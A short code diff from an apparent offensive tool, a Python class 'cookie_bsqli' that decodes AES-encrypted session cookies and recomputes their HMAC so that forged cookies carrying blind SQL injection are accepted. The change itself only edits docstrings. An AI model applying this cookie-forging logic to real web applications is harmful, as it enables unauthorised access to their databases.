@@ -69,9 +69,6 @@ class cookie_bsqli:
 		return cookie_dict, cookie_id
 
 	def __decode_value(self):
-		"""
-		Decode the target cookie's json "value" and "iv" base64 encoded strings
-		"""
 		encrypted_val = b64decode(self.cookie_dict['value'])
 		self.aes.iv = b64decode(self.cookie_dict['iv'])
 		return encrypted_val
@@ -99,7 +96,7 @@ class cookie_bsqli:
 		self.cookie_dict['mac'] = hmac.new(self.aes.key, (self.cookie_dict['iv']+self.cookie_dict['value']).encode(), hashlib.sha256).hexdigest()
 
 		"""
-		Convert cookie_dict to json then base64
+		Convert cookie_dict to json then base64 encode it
 		"""
 		return json.dumps(self.cookie_dict).encode()
 
